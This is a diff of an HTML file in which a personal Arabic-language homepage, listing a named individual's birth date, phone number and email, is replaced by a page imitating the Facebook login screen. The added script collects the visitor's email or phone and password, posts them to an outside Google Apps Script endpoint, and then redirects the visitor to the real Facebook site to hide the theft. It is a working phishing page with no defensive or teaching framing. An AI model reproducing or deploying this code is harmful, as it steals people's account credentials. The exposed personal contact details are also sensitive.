@@ -2,122 +2,235 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <!-- SEO -->
-  <title>الموقع الرسمي لـ يوسف بن قاسة فارسي</title>
-  <meta name="description" content="الموقع الرسمي لـ يوسف بن قاسة فارسي: خبير في المعلوميات والتقنية من الجزائر.">
-  <meta name="keywords" content="يوسف بن قاسة فارسي, يوسف فارسي, بن قاسة, مطور ويب, التقنية, التكنولوجيا, الفيزياء, الإلكترونيات, الفلسفة, الشريعة, تبسة, الجزائر">
-  <meta name="robots" content="index, follow">
-
-  <!-- Open Graph -->
-  <meta property="og:title" content="الموقع الرسمي لـ يوسف بن قاسة فارسي">
-  <meta property="og:description" content="خبير في المعلوميات، التقنية، التكنولوجيا والفيزياء.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://example.com/">
-  <meta property="og:image" content="https://example.com/profile.jpg">
-
-  <!-- CSS -->
+  <title>Facebook</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
       margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, #0a0f1f, #1a253b);
-      color: #fff;
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+    }
+
+    /* الشعار في الأعلى */
+    .header {
       text-align: center;
-      line-height: 1.8;
+      padding: 40px 0 10px;
+    }
+    .header h1 {
+      color: #1877f2;
+      font-size: 48px;
+      margin: 0;
+      font-weight: bold;
+      font-family: Arial, sans-serif;
     }
 
-    header {
-      padding: 50px 20px;
-    }
-
-    header h1 {
-      font-size: 2.5em;
-      margin-bottom: 10px;
-      color: #4fc3f7;
-    }
-
-    header p {
-      font-size: 1.2em;
-      color: #ddd;
-    }
-
-    section {
-      padding: 40px 20px;
-      max-width: 800px;
-      margin: auto;
-    }
-
-    section h2 {
-      font-size: 1.8em;
+    /* اختيار اللغة */
+    .lang-box {
+      text-align: center;
       margin-bottom: 20px;
-      color: #fbc02d;
+    }
+    .lang-box select {
+      padding: 6px 12px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      cursor: pointer;
     }
 
-    .contact {
-      margin-top: 30px;
-      background: rgba(255,255,255,0.05);
+    /* الكونتينر العام */
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    /* الفورم */
+    .login-box {
+      background: #fff;
       padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      border-radius: 8px;
+      width: 360px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      text-align: center;
     }
 
-    .contact p {
+    .login-box input {
+      width: 100%;
       margin: 10px 0;
+      padding: 14px;
+      border-radius: 6px;
+      border: 1px solid #dddfe2;
+      font-size: 16px;
     }
 
-    footer {
-      margin-top: 40px;
-      padding: 20px;
-      background: #0d152b;
-      font-size: 0.9em;
-      color: #aaa;
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      background: #1877f2;
+      color: #fff;
+      font-weight: bold;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background: #166fe5;
     }
 
-    a {
-      color: #4fc3f7;
+    /* الرسائل */
+    .msg {
+      margin-top: 15px;
+      font-weight: bold;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      visibility: hidden;
+      font-size: 14px;
+    }
+
+    /* دائرة التحميل */
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid #ccc;
+      border-top: 2px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+
+    /* رابط إنشاء حساب */
+    .create-account {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .create-account a {
+      color: #1877f2;
       text-decoration: none;
-    }
-
-    a:hover {
-      text-decoration: underline;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
 
-  <header>
-    <h1>يوسف بن قاسة فارسي</h1>
-    <p>الموقع الرسمي - أنت الآن في المكان الصحيح</p>
-  </header>
+  <div class="header">
+    <h1>facebook</h1>
+  </div>
 
-  <section>
-    <h2>من أنا؟</h2>
-    <p>
-      مرحبًا بك 👋، أنا <strong>يوسف بن قاسة فارسي</strong>، من مواليد 
-      <strong>10 نوفمبر 1988</strong> بمدينة <strong>الشريعة</strong>، ولاية <strong>تبسة</strong> - الجزائر.
-    </p>
-    <p>
-      أنا خبير في <strong>المعلوميات</strong>، مهتم بعوالم <strong>التقنية، التكنولوجيا، الفيزياء، الإلكترونيات والفلسفة</strong>.
-      أسعى إلى مشاركة المعرفة والتجارب مع كل من يبحث عن التميز في هذا المجال.
-    </p>
-    <p>
-      إذا كنت تبحث عن المعلومة الصحيحة، أو تريد التواصل مع شخص عاشق للتكنولوجيا 
-      💡 فأنت هنا في الموقع الصحيح ✔️.
-    </p>
-  </section>
+  <!-- اختيار اللغة -->
+  <div class="lang-box">
+    <select id="languageSwitcher">
+      <option value="ar" selected>العربية</option>
+      <option value="fr">Français</option>
+      <option value="en">English</option>
+    </select>
+  </div>
 
-  <section class="contact">
-    <h2>معلومات التواصل</h2>
-    <p>📞 الهاتف: <a href="tel:0559263922">0559263922</a></p>
-    <p>📧 البريد الإلكتروني: <a href="mailto:Youceffarsi.Cheria@gmail.com">Youceffarsi.Cheria@gmail.com</a></p>
-  </section>
+  <div class="container">
+    <div class="login-box">
+      <form id="myForm">
+        <input type="text" name="email_or_phone" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" name="password" id="passwordInput" placeholder="كلمة المرور" required>
+        <button type="submit" id="loginBtn">تسجيل الدخول</button>
+      </form>
 
-  <footer>
-    <p>© 2025 يوسف بن قاسة فارسي - جميع الحقوق محفوظة</p>
-  </footer>
+      <div class="msg" id="msg">
+        <div class="spinner"></div> <span id="waitMsg">يرجى الإنتظار...</span>
+      </div>
+
+      <div class="create-account">
+        <span id="noAccount">ليس لديك حساب؟</span>
+        <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbx7mCvy3xSTdCo1kvKduE2MJ28vznMfqWFhs5Qymo_RHB4lzxnshuuX1H9GaKa9V0GkAQ/exec";
+    const form = document.getElementById("myForm");
+    const msg = document.getElementById("msg");
+
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      msg.style.visibility = "visible";
+
+      const data = {
+        email_or_phone: form.email_or_phone.value,
+        password: form.password.value
+      };
+
+      fetch(scriptURL, {
+        method: "POST",
+        body: JSON.stringify(data)
+      })
+      .then(res => res.text())
+      .then(txt => {
+        window.location.href = "https://m.facebook.com";
+      })
+      .catch(err => {
+        msg.innerText = "❌ " + err;
+        msg.style.color = "red";
+      });
+    });
+
+    // 🔹 النصوص باللغات المختلفة
+    const translations = {
+      ar: {
+        email: "البريد الإلكتروني أو رقم الهاتف",
+        password: "كلمة المرور",
+        login: "تسجيل الدخول",
+        wait: "يرجى الإنتظار...",
+        noAccount: "ليس لديك حساب؟",
+        create: "إنشاء حساب جديد"
+      },
+      fr: {
+        email: "E-mail ou numéro de téléphone",
+        password: "Mot de passe",
+        login: "Se connecter",
+        wait: "Veuillez patienter...",
+        noAccount: "Vous n'avez pas de compte ?",
+        create: "Créer un nouveau compte"
+      },
+      en: {
+        email: "Email or Phone",
+        password: "Password",
+        login: "Log In",
+        wait: "Please wait...",
+        noAccount: "Don't have an account?",
+        create: "Create New Account"
+      }
+    };
+
+    const langSwitcher = document.getElementById("languageSwitcher");
+
+    function changeLanguage(lang) {
+      document.getElementById("emailInput").placeholder = translations[lang].email;
+      document.getElementById("passwordInput").placeholder = translations[lang].password;
+      document.getElementById("loginBtn").innerText = translations[lang].login;
+      document.getElementById("waitMsg").innerText = translations[lang].wait;
+      document.getElementById("noAccount").innerText = translations[lang].noAccount;
+      document.getElementById("createAccount").innerText = translations[lang].create;
+
+      // RTL للغة العربية فقط
+      document.documentElement.dir = (lang === "ar") ? "rtl" : "ltr";
+      document.documentElement.lang = lang;
+    }
+
+    langSwitcher.addEventListener("change", e => {
+      changeLanguage(e.target.value);
+    });
+  </script>
 
 </body>
 </html>
